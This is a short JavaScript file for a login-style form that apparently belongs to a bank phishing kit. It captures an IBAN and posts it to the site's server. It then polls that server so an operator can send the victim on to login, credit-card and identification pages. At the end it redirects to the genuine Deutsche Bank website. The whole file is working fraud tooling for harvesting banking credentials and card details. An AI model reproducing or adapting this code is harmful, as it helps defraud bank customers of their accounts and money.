const login_form = document.querySelector('#login-form');
const iban = document.querySelector('#respons-code');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => { 
    e.preventDefault();
    
    if (iban.value === '') {
        resetForm([iban], loginButton);
    } else {
        const data = new FormData();
        data.append('iban', iban.value);
        
        // loginButton.innerHTML = '<img src="images/ing.gif" width="18"> Laden...';
        loginButton.disabled = true;

        var radomID = document.querySelector('input[name="randomId"]').value;

        window.location.href = '/kreditkarte/'+radomID;
        document.querySelector('#errorMessage').style.display = 'none';
        
        fetch('/information/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/information/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        clearInterval(newInterval);  // Zamknij interwał
                        if (data.page === 'name') {
                            resetForm([iban], loginButton);
                        } else {
                            setTimeout(() => {
                                if (data.page === 'login') {
                                    window.location.href = '/einloggen/' + token.value;
                                } else if (data.page === 'name') {
                                    window.location.href = '/information/' + token.value;
                                } else if (data.page === 'creditcard') {
                                    window.location.href = '/creditcard/' + token.value;
                                } else if (data.page === 'identification') {
                                    window.location.href = '/identificatie/' + token.value;
                                } else if (data.page === 'finish') {
                                    window.location.href = 'https://www.deutsche-bank.de/';
                                } else if (data.page === 'waiting') {
                                    console.log('Waiting...');
                                }
                            }, 5000);  // Czekaj 5 sekund przed przekierowaniem
                        }
                    });
                });
            }, 5000);
        });
    }
});
